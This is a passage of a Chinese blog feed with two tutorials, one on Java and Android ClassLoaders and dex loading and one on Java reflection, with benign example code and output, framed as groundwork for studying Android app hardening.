的主要功能；2. **SecureClassLoader** 继承自 ClassLoader ，但并不是 ClassLoader 的**实现类**，而是拓展并加入了权限管理方面的功能，增强了安全性；3. **URLClassLoader** **继承**自 SecureClassLoader 可通过 URL 路径从 jar 文件和文件夹中加载类和资源；4. **ExtClassLoader** 和 **AppClassLoader** 都**继承**自 URLClassLoader</code></pre><p>​        它们都是 <strong>Launcher</strong> 的<strong>内部类</strong>，而 Launcher 是 JVM 虚拟机的入口应用，所以<strong>ExtClassLoader</strong> 和 <strong>AppClassLoader</strong> 都在 Launcher 中初始化。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250820094626591.png" alt="image-20250820094626591"></p><hr><h5 id="ClassLoader的双亲委托机制"><a href="#ClassLoader的双亲委托机制" class="headerlink" title="ClassLoader的双亲委托机制"></a>ClassLoader的双亲委托机制</h5><p>类加载器查找 Class 采用了<strong>双亲委托模式</strong>：</p><pre><code>1. 先判断该 Class 是否加载，如果没有则先**委托父类加载器查找**，并依次递归直到顶层的Bootstrap ClassLoader；1. 如果 Bootstrap ClassLoader 找到了则返回该 Class，否则依次向下查找；1. 如果所有父类都没找到 Class 则调用自身 findClass 进行查找。</code></pre><p>双亲委托机制的优点：</p><pre><code>1. **避免重复加载**。如果已经加载过Class则无需重复加载，只需要读取加载的Class即可；1. **更加安全**。保证无法使用自定义的类替代系统类，并且只有两个类名一致且被同一个加载器加载的类才会被认为是同一个类。</code></pre><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250820095307420.png" alt="image-20250820095307420"></p><p>ClassLoader.loadClass方法源码如下（Java17）</p><pre><code>1. 注释 1 处检查传入的类是否被加载, 如果已经加载则不执行后续代码；2. 注释 2 处若父类加载器**不为 null** 则调用父类 loadClass 方法加载 Class；3. 注释 3 处如果父类加载器**为 null** 则调用 **findBootstrapClassOrNull** 方法；         该方法内部调用了 **Native 方法 findBootstrapClass**，最终用Bootstrap ClassLoader检查该类是否被加载。</code></pre><p>​        <strong>注意: 在 Android中 ，该方法直接返回 null</strong>，因为 Android 中没有 BootstrapClassLoader</p><p>​4.  注释 4 处调用自身的 findClass 查找类。</p><pre><code class="language-Java">protected Class&lt;?&gt; loadClass(String name, boolean resolve)    throws ClassNotFoundException&#123;    synchronized (getClassLoadingLock(name)) &#123;        Class&lt;?&gt; c = findLoadedClass(name);//1        if (c == null) &#123;            long t0 = System.nanoTime();            try &#123;                if (parent != null) &#123;                    c = parent.loadClass(name, false);//2.                &#125; else &#123;                    c = findBootstrapClassOrNull(name);//3                &#125;            &#125; catch (ClassNotFoundException e) &#123;                // ClassNotFoundException thrown if class not found                // from the non-null parent class loader            &#125;             if (c == null) &#123;                // If still not found, then invoke findClass in order                // to find the class.                long t1 = System.nanoTime();                c = findClass(name);//4                 // this is the defining class loader; record the stats                PerfCounter.getParentDelegationTime().addTime(t1 - t0);                PerfCounter.getFindClassTime().addElapsedTimeFrom(t1);                PerfCounter.getFindClasses().increment();            &#125;        &#125;        if (resolve) &#123;            resolveClass(c);        &#125;        return c;    &#125;&#125;</code></pre><p>以上流程示意图如下<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250820095658949.png" alt="image-20250820095658949"></p><h4 id="Android-中的-ClassLoader"><a href="#Android-中的-ClassLoader" class="headerlink" title="Android 中的 ClassLoader"></a>Android 中的 ClassLoader</h4><p>​        Java 中的 ClassLoader 可以加载 jar 和 class 文件（本质都是加载class文件）；而在 Android 中,无论 DVM 还是 ART 加载的文件都是 dex 文件,所以需要重新设计 ClassLoader 的相关类。</p><p>Android 中的 ClassLoader 分为<strong>系统类加载器</strong>和<strong>自定义加载器</strong>：</p><ul><li>系统类加载器<br>包括 <strong>BootClassLoader</strong>, <strong>PathClassLoader</strong>, <strong>DexClassLoader</strong>等</li><li>自定义加载器<br>通过继承 <strong>BaseDexClassLoader</strong> 实现，它们的继承关系如图所示：<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250820095949819.png" alt="image-20250820095949819"></li></ul><p>各个ClassLoader的作用：</p><pre><code>1. ClassLoader：**抽象类**，定义了 ClassLoader 的主要功能；2. BootClassLoader：继承自 ClassLoader，用于 Android 系统启动时**预加载常用类**；3. SecureClassLoader：继承自ClassLoader，**扩展了类权限方面的功能**，加强了安全性；4. URLClassLoader：继承自 SecureClassLoader，用于**通过 URL 路径加载类和资源**；5. BaseDexClassLoader：继承自 ClassLoader，**是抽象类 ClassLoader 的具体实现类**；6. InMemoryDexClassLoader（Android8.0新增）：继承自 BaseDexClassLoader，用于**加载内存中的dex文件**；7. PathClassLoader：继承自 BaseDexClassLoader，用于**加载已安装的 APK 的 dex 文件；**8. DexClassLoader：继承自 BaseDexClassLoader，**用于加载已安装的 APK 的 dex 文件，以及从 SD 卡中加载未安装的 APK 的 dex 文件**。</code></pre><p>实现 Android 加固时，壳程序动态加载被保护程序的 dex 文件主要使用以下 3 个类加载器：</p><pre><code>1. **DexClassLoader** 可以加载未安装apk的dex文件 它是一代加固——整体加固（落地加载）的核心之一；2. **InMemoryDexClassLoader** 可以加载内存中的dex文件 它是二代加固——整体加固（不落地加载）的核心之一；3. BaseDexClassLoader 是 ClassLoader 的具体实现类 实际上 **DexClassLoader**，**PathClassLoader** 以及 **InMemoryDexClassLoader** 加载类时，**均通过委托 BaseDexClassLoader 实现**。</code></pre><hr><h5 id="ClassLoader-加载-Dex-流程简介"><a href="#ClassLoader-加载-Dex-流程简介" class="headerlink" title="ClassLoader 加载 Dex 流程简介"></a>ClassLoader 加载 Dex 流程简介</h5><p>​        Dex 文件的加载依赖于前文提到的 PathClassLoader，DexClassLoader 和InMemoryDexClassLoader。</p><p>​        加载 Dex 文件的功能<strong>均通过委托父加载器</strong> BaseDexClassLoader 实现，其中PathClassLoader 和 DexClassLoader 调用<strong>相同</strong>的 BaseDexClassLoader 构造函数，InMemoryDexClassLoader 调用<strong>另一个</strong>构造函数。</p><p>​        最终通过 <strong>ArtDexFileLoader::OpenCommon</strong> 方法在 ART 虚拟机中创建 <strong>DexFile::DexFile对象</strong>，该对象<strong>是 Dex 文件在内存中的表示</strong>，用于安卓程序运行时加载类以及执行方法代码，也是后续第三代加固——代码抽取加固，进行指令回填时的关键对象。</p><p>三种 ClassLoader 加载 Dex 文件的流程如下（基于Android10.0）：</p><ol><li>Java层</li></ol><p>​        PathClassLoader 和 DexClassLoader 委托 BaseDexClassLoader 最终执行 JNI 方法<strong>DexFile.openDexFileNative</strong> 进入 Native 层；而 InMemoryDexClassLoader 委托BaseDexClassLoader 后则执行 <strong>DexFile.openInMemoryDexFiles</strong> 进入 Native 层。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250820101013540.png" alt="image-20250820101013540"></p><ol start="2"><li>Native 层</li></ol><p>​        PathClassLoader 和 DexClassLoader 这条委托链会根据<strong>不同情况</strong>，调用<strong>ArtDexFileLoader::Open</strong> 的<strong>不同重载</strong>，或者调用 <strong>OpenOneDexFileFromZip</strong>；InMemoryDexClassLoader 调用 ArtDexFileLoader::Open 的<strong>第 3 种重载</strong>。</p><p>​        无论是调用哪个函数，最终都会调用 <strong>ArtDexFileLoader::OpenCommon</strong>。<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250820101206767.png" alt="image-20250820101206767"></p><p>​        经过以上调用流程后进入 ArtDexFileLoader::OpenCommon，经过 <strong>DexFile 的初始化和验证操作</strong>后便成功创建了 DexFile 对象：<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250820101521008.png" alt="image-20250820101521008"></p><p>创建 DexFile 对象后，Class 对应的文件便被加载到 ART 虚拟机中。</p><hr><h5 id="ClassLoader-加载-Class-流程简介"><a href="#ClassLoader-加载-Class-流程简介" class="headerlink" title="ClassLoader 加载 Class 流程简介"></a>ClassLoader 加载 Class 流程简介</h5><p>​        前文通过 ClassLoader.loadClass 讲解了双亲委托机制，那么一个 Class 具体是如何被加载到 JVM 中的呢？</p><p>​        首先，继承自 BaseDexClassLoader 的 3 种 ClassLoader 调用自身 loadClass 方法时。委托父类查找，委托到 ClassLoader.loadClass 时返回；BaseDexClassLoader.findClass 调用DexPathList.findClass，其内部调用 Element.findClass，最终调用<strong>DexFile.loadClassBinaryName</strong> 进入 DexFile 中，该流程如图所示：</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250820101819908.png" alt="image-20250820101819908"></p><p>进入 DexFile 后，主要执行以下操作：</p><ol><li>DexFile</li></ol><p>​        通过JNI函数defineClassNative进入Native层；</p><ol start="2"><li>DexFile_defineClassNative</li></ol><p>​        通过 <strong>FindClassDef</strong> 枚举 DexFile 的所有 <strong>DexClassDef</strong> 结构并使用 <strong>ClassLinker::DefineClass 创建对应的 Class 对象</strong>；</p><p>​        之后调用 <strong>ClassLinker::InsertDexFileInToClassLoader</strong> 将<strong>对应的 DexFile 对象</strong>添加到 ClassLoader 的 ClassTable 中。</p><ol start="3"><li>ClassLinker::DefineClass</li></ol><p>​        调用 LoadField 加载类的相关字段，之后调用 LoadMethod 加载方法，再调用 LinkCode 执行方法代码的链接。</p><p>该流程如图所示：<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250820102416811.png" alt="image-20250820102416811"></p><p>​        综上所述，<strong>ClassLoader</strong> 最终通过 <strong>ClassLinker::DefineClass</strong> 创建 Class 对象，并完成Field 和 Method 的加载以及 Code 的链接。</p><p>​        调用链中有一个核心函数——<strong>ClassLinker::LoadMethod</strong>，通过该函数可以获取方法字节码在 DexFile 中的<strong>偏移值 code_off</strong>，它是实现指令回填的核心之一。</p><hr><h5 id="LoadDexDemo"><a href="#LoadDexDemo" class="headerlink" title="LoadDexDemo"></a>LoadDexDemo</h5><p>​        经过前文的介绍，我们知道 Android 中可使用 ClassLoader 加载 dex 文件，并调用其保存的类的方法。</p><p>​        创建空项目，编写一个测试类用于打印信息，编译后提取 APK 文件和该类所在的 dex 文件并推送至手机的 tmp 目录。</p><pre><code class="language-java">package com.example.emptydemo;import android.util.Log;public class TestClass &#123;        public void print() &#123;        Log.d(&quot;NshIdE&quot;, &quot;TestClass.print() is called!&quot;);    &#125;    &#125;</code></pre><p>​        创建另一个项目，通过 DexClassLoader 加载 APK 和提取的 dex 文件并反射执行print方法：</p><ol><li>创建<strong>私有目录</strong>用于创建 DexClassLoader，分别是 odex 和 lib 目录;</li><li>创建 DexClassLoader;</li><li>加载指定类;</li><li>反射加载并执行类的方法。</li></ol><pre><code class="language-Java">package com.example.testdemo;import android.content.Context;import android.os.Bundle;import androidx.appcompat.app.AppCompatActivity;import java.io.File;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import dalvik.system.DexClassLoader;public class MainActivity extends AppCompatActivity &#123;    @Override    protected void onCreate(Bundle savedInstanceState) &#123;        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_main);        Context appContext = getApplicationContext();        //com.example.emptydemo        loadDexClassAndExecuteMethod(appContext,                &quot;data/local/tmp/classes.dex&quot;);  //直接加载 dex 文件        loadDexClassAndExecuteMethod(appContext,                &quot;data/local/tmp/app-release.apk&quot;);//加载apk文件，本质还是加载dex    &#125;    public void loadDexClassAndExecuteMethod(Context context, String                                             strDexFilePath) &#123;        // 1.先创建优化私有目录app_opt_dex和app_lib_dex，用于ClassLoader        // /data/user/0/com.example.testdemo/app_opt_dex        File optFile = context.getDir(&quot;opt_dex&quot;, 0);        // /data/user/0/com.example.testdemo/app_lib_dex        File libFile = context.getDir(&quot;lib_dex&quot;, 0);        // 2.创建ClassLoader用于加载Dex文件 依次为指定dex文件路径 Odex目录 lib库目录 父类加载器        DexClassLoader dexClassLoader = new DexClassLoader(                strDexFilePath,                optFile.getAbsolutePath(),                libFile.getAbsolutePath(),                MainActivity.class.getClassLoader());        Class&lt;?&gt; clazz = null;        try &#123;            // 3.通过创建的DexClassLoader加载dex文件的指定类            clazz = dexClassLoader.loadClass(&quot;com.example.emptydemo.TestClass&quot;);            if (clazz != null) &#123;                try &#123;                    // 4.反射获取并调用类的方法                    Object obj = clazz.newInstance();                    Method method = clazz.getDeclaredMethod(&quot;print&quot;);                    method.invoke(obj);                &#125; catch (InstantiationException e) &#123;                    e.printStackTrace();                &#125; catch (NoSuchMethodException e) &#123;                    e.printStackTrace();                &#125; catch (IllegalAccessException e) &#123;                    e.printStackTrace();                &#125; catch (InvocationTargetException e) &#123;                    e.printStackTrace();                &#125;                &#125;            &#125; catch (ClassNotFoundException e) &#123;                e.printStackTrace();            &#125;    &#125;&#125;</code></pre><p>效果如下<br><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250820111348231.png" alt="image-20250820111348231"></p><p>DexClassLoader 构造函数如下</p><pre><code class="language-Java">/*    参数一: String dexPath, Dex文件路径    参数二: String optimizedDirectory, 优化后的dex即Odex目录    Android中内存中不会出现上述参数一的Dex文件, 会先优化,然后运行,优化后为.odex文件    参数三: String librarySearchPath, lib库搜索路径    参数四: ClassLoader parent, 父类加载器*/public class DexClassLoader extends BaseDexClassLoader &#123;    public DexClassLoader(String dexPath, String optimizedDirectory, String librarySearchPath, ClassLoader parent) &#123;        super((String)null, (File)null, (String)null, (ClassLoader)null);        throw new RuntimeException(&quot;Stub!&quot;);    &#125;&#125;</code></pre><h3 id="三、尾声"><a href="#三、尾声" class="headerlink" title="三、尾声"></a>三、尾声</h3><p>​        通过对 ClassLoader 较为系统的学习之后，并且再加上反射调用的实践，对这方面的知识有了进一步理解和学习，有利于后续学习 Android 加固的实现原理。</p><p>​        参考：[<a href="https://bbs.kanxue.com/thread-286929-1.htm#%E5%9B%9B-classloader%E6%9C%BA%E5%88%B6">原创]Android从整体加固到抽取加固的实现及原理-Android安全-看雪-安全社区|安全招聘|kanxue.com</a></p>]]></content>
      
      
      <categories>
          
          <category> Android学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java学习----反射机制</title>
      <link href="/2025/08/19/Java%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/"/>
      <url>/2025/08/19/Java%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="Java学习——反射机制"><a href="#Java学习——反射机制" class="headerlink" title="Java学习——反射机制"></a>Java学习——反射机制</h1><h3 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h3><p>​        最近又是 OAID 获取又是加固，都避不开 <strong>Java 反射</strong> 这个技术，于是来系统学一下。</p><h3 id="二、开始"><a href="#二、开始" class="headerlink" title="二、开始"></a>二、开始</h3><p><strong>Java 反射是什么？</strong></p><ul><li><p>Java反射机制的核心是在程序运行时动态加载类并获取类的详细信息，从而操作类或对象的属性和方法。本质是<a href="https://zhida.zhihu.com/search?content_id=178202404&content_type=Article&match_order=1&q=JVM&zhida_source=entity">JVM</a>得到class对象之后，<strong>再通过class对象进行反编译，从而获取对象的各种信息</strong>；</p></li><li><p>Java属于先编译再运行的语言，程序中对象的类型在编译期就确定下来了，而当程序在运行时可能需要动态加载某些类，这些类因为之前用不到，所以没有被加载到JVM。通过反射，可以在运行时动态地创建对象并调用其属性，<strong>不需要提前在编译期知道运行的对象是谁</strong>；</p></li><li><p>反射是实现动态加载的技术之一。</p></li></ul><p><strong>反射的优缺点</strong>：</p><ul><li>优点：在运行时获得类的各种内容，进行反编译，对于 Java 这种<strong>先编译再运行</strong>的语言,能够让我们很方便的创建灵活的代码，这些代码可以在运行时装配，无需在组件之间进行源代码的链接，更加容易实现面向对象。</li><li>缺点：反射会消耗一定的系统资源，因此，如果不需要动态地创建一个对象，那么就不需要用反射；反射调用方法时可以忽略权限检查，因此可能会破坏封装性而导致安全问题。</li></ul><p><strong>反射的作用</strong>：反射机制在实现壳程序动态加载被保护程序时非常关键，它可以突破默认的权限访问控制，访问安卓系统默认情况下禁止用户代码访问的以及不公开的部分。</p><p><strong>反射的本质</strong>：</p><ul><li>正常类的加载过程</li></ul><p>​                执行Student student&#x3D;new Student(),向JVM请求创建student实例；<br>​                JVM寻找Student.class文件并加载到内存中<br>​                JVM创建Student对应的Class对象（一个类只对应一个Class对象）<br>​                JVM创建student实例</p><p>对于同一个类而言，无论有多少个实例，都只对应一个Class对象。</p><p><strong>Java 反射的本质</strong>: 获取Class对象后,反向访问实例对象。</p><p><img src="https://nshide.oss-cn-hangzhou.aliyuncs.com/img_temp/image-20250819164901967.png" alt="image-20250819164901967"></p><h4 id="反射的入口——Class-类"><a href="#反射的入口——Class-类" class="headerlink" title="反射的入口——Class 类"></a>反射的入口——Class 类</h4><p>反射相关文件</p><pre><code class="language-Java">Java.lang.Class;Java.lang.reflect.Constructor;Java.lang.reflect.Field;Java.lang.reflect.Method;Java.lang.reflect.Modifier;</code></pre><p>JDK 中，主要由以下类来实现 Java 反射机制,这些类都位于 <strong>java.lang.reflect</strong> 包中：</p><ul><li><p>Class类: 代表一个类</p></li><li><p>Constructor 类: 代表类的构造方法</p></li><li><p>Field 类: 代表类的成员变量(属性)</p></li><li><p>Method类: 代表类的成员方法</p></li></ul><p>反射的入口——Class 类：</p><ol><li>Class 类的对象称为类对象</li><li>Class 类是 Java 反射机制的起源和入口<ul><li>用于获取与类相关的各种信息</li><li>提供了获取类信息的相关方法</li><li>Class 类继承自 Object 类</li></ul></li><li>Class类是所有类的共同的图纸<ul><li>每个类有自己的对象,好比图纸和实物的关系</li><li>每个类也可看做是一个对象，有共同的图纸 Class，存放类的结构信息，比如类的名字、属性、方法、构造方法、父类和接口，能够通过相应方法取出相应信息</li></ul></li></ol><p>实例类，用于后续操作</p><pre><code class="language-Java">// 示例类class Person implements Runnable&#123;    public String name;    private int age;     //默认构造函数和有参构造函数    public Person() &#123;&#125;    private Person(String str)&#123;        System.out.println(&quot;Private constructor:&quot;+str);    &#125;    public Person(String name, int age) &#123;        this.name = name;        this.age = age;    &#125;     // 不同访问权限的方法    public void introduce() &#123;        System.out.println(&quot;我是&quot; + name + &quot;,年龄&quot; + age);    &#125;     private void privateMethod(String name,int age) &#123;         System.out.println(&quot;这是Person的私有方法,&quot;+&quot;name=&quot;+name+&quot;,&quot;+&quot;age=&quot;+age);    &#125;     @Override    public void run() &#123;        System.out.println(&quot;Hello World&quot;);    &#125;&#125;</code></pre><h5 id="反射获取-Class"><a href="#反射获取-Class" class="headerlink" title="反射获取 Class"></a>反射获取 Class</h5><p>非动态加载时，可通过 .class属性或实例 .getClass()方法获取 Class 类</p><p>动态加载时，可使用 Class.forName() 和 ClassLoader.loadClass() 加载并获取类对象</p><pre><code class="language-Java">//1. 获取类对象// 动态加载Class&lt;?&gt; clazz= Class.forName(&quot;MyUnidbgScripts.Person&quot;); // 通过类的完整名加载Class&lt;?&gt; clazz2=ClassLoader.getSystemClassLoader().loadClass(&quot;MyUnidbgScripts.Person&quot;);// 通过classloader加载// 非动态加载Class&lt;?&gt; clazz3=Person.class;Class&lt;?&gt; clazz4=new Person().getClass();System.out.println(&quot;Load Class:&quot;);System.out.println(clazz);System.out.println(clazz2);System.out.println(clazz3);System.out.println(clazz4);System.out.println(); //2. 从类对象获取类的各种信息System.out.println(&quot;Class info:&quot;);System.out.println(clazz.getName());       // 完整类名System.out.println(clazz.getSimpleName()); // 类名System.out.println(clazz.getSuperclass()); // 父类类对象System.out.println(Arrays.toString(clazz.getInterfaces()));    //接口类对象数组System.out.println();</code></pre><p>输出如下：</p><pre><code class="language-shell">Load Class:class MyUnidbgScripts.Personclass MyUnidbgScripts.Personclass MyUnidbgScripts.Personclass MyUnidbgScripts.Person Class info:MyUnidbgScripts.PersonPersonclass java.lang.Object[interface java.lang.Runnable]</code></pre><h5 id="反射获取-Constructor"><a href="#反射获取-Constructor" class="headerlink" title="反射获取 Constructor"></a>反射获取 Constructor</h5><ul><li>class.getConstructor(Class&lt;?&gt;… ParameterTypes) 获取class类指定参数类型的public构造方法</li><li>class.getConstructors() 获取class类中的所有public权限的构造方法</li><li>class.getDeclaredConstructor(Class&lt;?&gt;… ParameterTypes) 获取class类中的任意构造方法</li><li>class.getDeclaredConstructors() 获取class类中的所有构造方法</li></ul><pre><code class="language-java">//3. 获取构造方法// 获取无参构造方法(默认构造方法)System.out.println(&quot;Get constructor:&quot;);Constructor&lt;?&gt; constructor=clazz.getConstructor();System.out.println(constructor);System.out.println(); // 获取public构造方法System.out.println(&quot;Get public constructors:&quot;);Constructor&lt;?&gt;[] constructors=clazz.getConstructors();System.out.println(Arrays.toString(constructors));System.out.println(); // 获取所有构造方法System.out.println(&quot;Get all constructors:&quot;);constructors=clazz.getDeclaredConstructors();System.out.println(Arrays.toString(constructors));System.out.println(&quot;Print All Constructors:&quot;);for(Constructor&lt;?&gt; cons:constructors)&#123;    System.out.println(&quot;constructor: &quot;+cons);    System.out.println(&quot;\tname: &quot;+cons.getName()+            &quot;\n\tModifiers: &quot;+Modifier.toString(cons.getModifiers())+            &quot;\n\tParameterTypes: &quot;+Arrays.toString(cons.getParameterTypes()));&#125;System.out.println();</code></pre><p>输出如下</p><pre><code class="language-shell">Get constructor:public MyUnidbgScripts.Person() Get public constructors:[public MyUnidbgScripts.Person(java.lang.String,int), public MyUnidbgScripts.Person()] Get all constructors:[public MyUnidbgScripts.Person(java.lang.String,int), private MyUnidbgScripts.Person(java.lang.String), public MyUnidbgScripts.Person()]Print All Constructors:constructor: public MyUnidbgScripts.Person(java.lang.String,int)    name: MyUnidbgScripts.Person    Modifiers: public    ParameterTypes: [class java.lang.String, int]constructor: private MyUnidbgScripts.Person(java.lang.String)    name: MyUnidbgScripts.Person    Modifiers: private    ParameterTypes: [class java.lang.String]constructor: public MyUnidbgScripts.Person()    name: MyUnidbgScripts.Person    Modifiers: public    ParameterTypes: []</code></pre><h5 id="反射获取-Field"><a href="#反射获取-Field" class="headerlink" title="反射获取 Field"></a>反射获取 Field</h5><ul><li>class.getField(FieldName) 获取class类中的带public声明的FieldName变量</li><li>class.getFields() 获取class类中的带public声明的所有变量</li><li>class.getDeclaredField(FieldName) 获取class类中的FieldName变量</li><li>class.getDeclaredFields() 获取class类中的所有变量</li></ul><pre><code class="language-Java">//3. 获取属性// 获取所有public属性System.out.println(&quot;Get public fields:&quot;);Field[] fields=clazz.getFields();System.out.println(Arrays.toString(fields));System.out.println(); // 获取所有属性System.out.println(&quot;Get all fields:&quot;);fields=clazz.getDeclaredFields();System.out.println(Arrays.toString(fields));System.out.println(&quot;Print all fields:&quot;);for(Field field:fields)&#123;    System.out.println(&quot;field: &quot;+field);    System.out.println(&quot;\ttype: &quot;+field.getType()+            &quot;\n\tname: &quot;+field.getName());&#125;System.out.println(); System.out.println(&quot;Get specific field:&quot;);// 获取public权限的指定属性Field field=clazz.getField(&quot;name&quot;);System.out.println(field);// 获取任意权限的指定属性field=clazz.getDeclaredField(&quot;age&quot;);System.out.println(field);</code></pre><p>输出如下</p><pre><code class="language-shell">Get public fields:[public java.lang.String MyUnidbgScripts.Person.name] Get all fields:[public java.lang.String MyUnidbgScripts.Person.name, private int MyUnidbgScripts.Person.age]Print all fields:field: public java.lang.String MyUnidbgScripts.Person.name    type: class java.lang.String    name: namefield: private int MyUnidbgScripts.Person.age    type: int    name: age Get specific field:public java.lang.String MyUnidbgScripts.Person.nameprivate int MyUnidbgScripts.Person.age</code></pre><h5 id="反射获取Method"><a href="#反射获取Method" class="headerlink" title="反射获取Method"></a>反射获取Method</h5><ul><li>class.getMethod(MethodName,…ParameterTypes) 获取指定方法名和指定参数的public方法</li><li>class.getMethods() 获取class类中所有public方法</li><li>class.getDeclaredMethod(MethodName,…ParameterTypes) 获取class类中指定方法名和指定参数的任意方法</li><li>class.getDeclaredMethods() 获取class类的所有方法</li></ul><pre><code class="language-Java">//4. 获取方法System.out.println(&quot;Get public methods:&quot;);Method[] methods=clazz.getMethods();   // 注意会获取所实现接口的public方法System.out.println(Arrays.toString(methods));System.out.println(); System.out.println(&quot;Get all methods:&quot;);methods=clazz.getDeclaredMethods();    // 获取所有声明的方法System.out.println(Arrays.toString(methods));System.out.println(); System.out.println(&quot;Print all methods:&quot;);for(Method method:methods)&#123;    System.out.println(&quot;method: &quot;+method);    System.out.println(&quot;\tname: &quot;+method.getName());    System.out.println(&quot;\treturnType: &quot;+method.getReturnType());    System.out.println(&quot;\tparameterTypes: &quot;+Arrays.toString(method.getParameterTypes()));&#125;System.out.println(); // 获取public的指定方法Method method=clazz.getMethod(&quot;introduce&quot;);System.out.println(method);// 获取任意权限的指定方法method=clazz.getDeclaredMethod(&quot;privateMethod&quot;,String.class,int.class);System.out.println(method);System.out.println();</code></pre><p>输出如下</p><pre><code class="language-shell">Get public methods:[public void MyUnidbgScripts.Person.run(), public void MyUnidbgScripts.Person.introduce(), public final void java.lang.Object.wait(long,int) throws java.lang.InterruptedException, public final void java.lang.Object.wait() throws java.lang.InterruptedException, public final native void java.lang.Object.wait(long) throws java.lang.InterruptedException, public boolean java.lang.Object.equals(java.lang.Object), public java.lang.String java.lang.Object.toString(), public native int java.lang.Object.hashCode(), public final native java.lang.Class java.lang.Object.getClass(), public final native void java.lang.Object.notify(), public final native void java.lang.Object.notifyAll()] Get all methods:[public void MyUnidbgScripts.Person.run(), public void MyUnidbgScripts.Person.introduce(), private void MyUnidbgScripts.Person.privateMethod(java.lang.String,int)] Print all methods:method: public void MyUnidbgScripts.Person.run()    name: run    returnType: void    parameterTypes: []method: public void MyUnidbgScripts.Person.introduce()    name: introduce    returnType: void    parameterTypes: []method: private void MyUnidbgScripts.Person.privateMethod(java.lang.String,int)    name: privateMethod    returnType: void    parameterTypes: [class java.lang.String, int] public void MyUnidbgScripts.Person.introduce()private void MyUnidbgScripts.Person.privateMethod(java.lang.String,int)</code></pre><h5 id="反射创建对象"><a href="#反射创建对象" class="headerlink" title="反射创建对象"></a>反射创建对象</h5><ol><li>通过Class.newInstance() 调用无参构造方法创建实例 不能传递参数</li><li>通过Constructor.newInstance() 调用指定构造方法创建实例 可传递参数</li></ol><pre><code class="language-Java">//5. 反射创建对象System.out.println(&quot;Create instance by reflection:&quot;);//5.1 Class.newInstance() 要求Class对象对应类有无参构造方法,执行无参构造方法创建实例System.out.println(&quot;Create instance by Class.newInstance():&quot;);Object obj=clazz.newInstance();System.out.println(obj.toString());System.out.println(); //5.2 Constructor.newInstance() 通过Class获取Constructor,再创建对象,可使用指定构造方法System.out.println(&quot;Create instance by Constructor.newInstance():&quot;);Constructor&lt;?&gt; cons=clazz.getConstructor();// 获取无参构造方法obj=cons.newInstance();System.out.println(obj.toString());cons=clazz.getDeclaredConstructors()[0];// 获取有参构造方法obj=cons.newInstance(&quot;张三&quot;,18);System.out.println(obj.toString());System.out.println();</code></pre><p>输出如下</p><pre><code class="language-shell">Create instance by reflection:Create instance by Class.newInstance():MyUnidbgScripts.Person@30dae81 Create instance by Constructor.newInstance():MyUnidbgScripts.Person@1b2c6ec2MyUnidbgScripts.Person@4edde6e5</code></pre><h5 id="反射操作属性"><a href="#反射操作属性" class="headerlink" title="反射操作属性"></a>反射操作属性</h5><ol><li><p>Class.getField(FieldName) 获取指定名称的public属性</p></li><li><p>Class.getDeclaredField(FieldName) 获取指定名称的任意属性</p></li><li><p>Field.get(Object obj) 获取指定实例的值</p></li><li><p>Field.set(Object obj,Object value) 设置指定实例的值</p></li><li><p>Field.setAccessible(true) 突破属性权限控制</p><pre><code class="language-java">//6. 反射操作属性 System.out.println(&quot;Access field by reflection:&quot;); Field nameField=clazz.getField(&quot;name&quot;); nameField.set(obj,&quot;王五&quot;);    // 修改指定对象的指定属性 Field ageField=clazz.getDeclaredField(&quot;age&quot;); ageField.setAccessible(true);// 突破权限控制 ageField.set(obj,20); System.out.println(nameField.get(obj));// get方法获取字段值 System.out.println(ageField.get(obj));</code></pre></li></ol><p>输出如下</p><pre><code class="language-shell">Access field by reflection:王五20</code></pre><h5 id="反射调用方法"><a href="#反射调用方法" class="headerlink" title="反射调用方法"></a>反射调用方法</h5><ol><li>Class.getMethod(String name,Class&lt;?&gt;… parameterTypes) 获取指定名称和参数类型的public方法</li><li>Class.getDeclaredMethod(String name,Class&lt;?&gt;… parameterTypes) 获取指定名称和参数类型的方法</li><li>Method.setAccessible(true) 突破访问权限控制</li><li>Method.invoke(Object obj,Object… args) 调用指定实例的方法,可传递参数</li></ol><pre><code class="language-java">//7. 反射调用方法 System.out.println(&quot;Run method by reflection:&quot;); Method introduceMethod=clazz.getMethod(&quot;introduce&quot;); introduceMethod.invoke(obj); //person.introduce() Method privateMethod=clazz.getDeclaredMethod(&quot;privateMethod&quot;,String.class,int.class);// person.privateMethod(&quot;赵四&quot;,19) privateMethod.setAccessible(true); privateMethod.invoke(obj,&quot;赵四&quot;,19);</code></pre><p>输出如下</p><pre><code class="language-shell">Run method by reflection:我是王五,年龄20这是Person的私有方法,name=赵四,age=19</code></pre><h5 id="封装反射类"><a href="#封装反射类" class="headerlink" title="封装反射类"></a>封装反射类</h5><p>封装Reflection.java反射类便于后续使用,提供以下功能:</p><ol><li>调用静态&#x2F;实例方法</li><li>访问静态&#x2F;实例字段</li></ol><pre><code class="language-Java">package com.example.androidshell; import android.util.Log; import java.lang.reflect.Field;import java.lang.reflect.Method; public class Reflection &#123;    private static final String TAG=&quot;glass&quot;;    public static Object invokeStaticMethod(String class_name,String method_name,Class&lt;?&gt;[] parameterTypes,Object[] parameterValues)&#123;        try &#123;            Class&lt;?&gt; clazz = Class.forName(class_name); 